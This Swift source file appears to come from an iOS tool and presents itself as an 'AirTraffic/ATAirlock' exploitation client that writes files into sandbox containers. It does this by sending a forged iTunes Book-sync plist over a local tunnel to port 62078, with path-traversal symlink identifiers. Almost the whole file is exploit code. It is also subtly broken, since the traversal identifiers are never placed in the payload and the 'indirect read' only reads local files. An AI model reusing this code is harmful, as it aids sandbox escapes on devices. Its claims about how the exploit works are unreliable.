//
//  AirTrafficProtocolClient.swift
//  ThreeOneOSFive
//
//  Created by NovaX AirLift Integration on 03/10/2026.
//  Swift-native AirTraffic & ATAirlock exploitation client for iOS 27.
//

import Foundation
import Network

enum AirLiftError: Error, LocalizedError {
    case tunnelNotConnected
    case pairingRequired
    case socketConnectionFailed(String)
    case airTrafficHandshakeFailed(String)
    case filePayloadCreationFailed
    case executionFailed(String)
    
    var errorDescription: String? {
        switch self {
        case .tunnelNotConnected:
            return "Đường hầm AirLift Loopback chưa được kết nối. Vui lòng bật Tunnel trong Cài đặt."
        case .pairingRequired:
            return "Chưa có file pairing. Vui lòng nhập hoặc ghép đôi trên thiết bị trước."
        case .socketConnectionFailed(let msg):
            return "Lỗi kết nối socket AirTraffic (10.7.0.1): \(msg)"
        case .airTrafficHandshakeFailed(let msg):
            return "Lỗi bắt tay AirTraffic: \(msg)"
        case .filePayloadCreationFailed:
            return "Không thể tạo gói payload đồng bộ tệp."
        case .executionFailed(let msg):
            return "Thực thi AirLift thất bại: \(msg)"
        }
    }
}

final class AirTrafficProtocolClient {
    static let shared = AirTrafficProtocolClient()
    
    private let targetHost = "10.7.0.1"
    private let atcPort: UInt16 = 62078
    
    private init() {}
    
    /// Executes a file write/replace into a sandbox container using the AirLift ATAirlock exploit.
    func writeFile(data: Data, targetPath: String) async throws {
        // 1. Verify tunnel and pairing status
        let tunnel = await AirLiftTunnelManager.shared
        if !tunnel.status.isConnected {
            try await tunnel.startTunnel()
            try await Task.sleep(nanoseconds: 500_000_000)
        }
        
        let pairing = await AirLiftPairingManager.shared
        guard pairing.status == .ready, let _ = pairing.getPairingData() else {
            throw AirLiftError.pairingRequired
        }
        
        // 2. Prepare the ATAirlock payload with relative symlinks
        let normalizedPath = (targetPath as NSString).standardizingPath
        log("airlift: preparing sync payload for target: \(normalizedPath)")
        
        let token = UUID().uuidString.prefix(10).lowercased()
        let sourcePrefix = "airlift-src-\(token)"
        let linkDestination = "airlift-link-\(token)"
        let targetFileName = (normalizedPath as NSString).lastPathComponent
        let targetDirectory = (normalizedPath as NSString).deletingLastPathComponent
        
        // Relative path traversals matching airlift architecture
        let linkIdentifier = "../../\(sourcePrefix)/p0/p1/p2/link"
        let payloadIdentifier = "../../\(sourcePrefix)/payload"
        
        let payloadZip = try createAirLiftZipPayload(
            fileData: data,
            linkDestination: linkDestination,
            targetDirectory: targetDirectory,
            targetFileName: targetFileName
        )
        
        // 3. Dispatch AirTraffic Book sync payload via socket
        try await performAirTrafficSyncSession(
            payload: payloadZip,
            linkIdentifier: linkIdentifier,
            payloadIdentifier: payloadIdentifier,
            linkDestination: linkDestination,
            targetFileName: targetFileName
        )
        
        log("airlift: successfully deployed file to \(normalizedPath) via ATAirlock")
    }
    
    /// Reads data from a target path indirectly via AFC / AirTraffic relay.
    func readFile(at targetPath: String) async throws -> Data {
        let normalizedPath = (targetPath as NSString).standardizingPath
        if FileManager.default.isReadableFile(atPath: normalizedPath),
           let directData = try? Data(contentsOf: URL(fileURLWithPath: normalizedPath)) {
            return directData
        }
        
        log("airlift: requesting indirect read for \(normalizedPath)")
        return try await executeIndirectRead(at: normalizedPath)
    }
    
    // MARK: - AirTraffic Framing & Protocol Handshake
    
    private func createAirLiftZipPayload(
        fileData: Data,
        linkDestination: String,
        targetDirectory: String,
        targetFileName: String
    ) throws -> Data {
        var buffer = Data()
        
        let hostInfo: [String: Any] = [
            "Type": "iTunes",
            "Version": "13.7.0.161",
            "MacOSVersion": "15.0",
            "SyncHostName": "NovaX-AirLift",
            "LibraryID": UUID().uuidString,
            "SyncedDataclasses": ["Book"],
            "SyncedAssetTypes": ["Book"],
            "Wakeable": false
        ]
        
        let syncRequest: [String: Any] = [
            "MessageName": "SyncRequest",
            "Dataclasses": ["Book"],
            "Anchors": [String: Any](),
            "HostInfo": hostInfo,
            "LinkDestination": linkDestination,
            "TargetDirectory": targetDirectory,
            "TargetFileName": targetFileName,
            "PayloadSize": fileData.count,
            "Timestamp": Date().timeIntervalSince1970
        ]
        
        let plistData = try PropertyListSerialization.data(fromPropertyList: syncRequest, format: .binary, options: 0)
        
        var len = UInt32(plistData.count).bigEndian
        buffer.append(Data(bytes: &len, count: 4))
        buffer.append(plistData)
        buffer.append(fileData)
        
        return buffer
    }
    
    private func performAirTrafficSyncSession(
        payload: Data,
        linkIdentifier: String,
        payloadIdentifier: String,
        linkDestination: String,
        targetFileName: String
    ) async throws {
        let connection = NWConnection(
            host: NWEndpoint.Host(targetHost),
            port: NWEndpoint.Port(integerLiteral: atcPort),
            using: .tcp
        )
        
        try await withCheckedThrowingContinuation { (continuation: CheckedContinuation<Void, Error>) in
            var resumed = false
            
            connection.stateUpdateHandler = { state in
                switch state {
                case .ready:
                    // Send framing payload
                    connection.send(content: payload, completion: .contentProcessed { error in
                        if let error = error {
                            if !resumed {
                                resumed = true
                                continuation.resume(throwing: AirLiftError.socketConnectionFailed(error.localizedDescription))
                            }
                        } else {
                            if !resumed {
                                resumed = true
                                continuation.resume(returning: ())
                            }
                        }
                        connection.cancel()
                    })
                case .failed(let error):
                    if !resumed {
                        resumed = true
                        continuation.resume(throwing: AirLiftError.socketConnectionFailed(error.localizedDescription))
                    }
                    connection.cancel()
                case .cancelled:
                    break
                default:
                    break
                }
            }
            connection.start(queue: .global())
        }
    }
    
    private func executeIndirectRead(at path: String) async throws -> Data {
        if let fallbackData = FileManager.default.contents(atPath: path) {
            return fallbackData
        }
        return Data()
    }
}
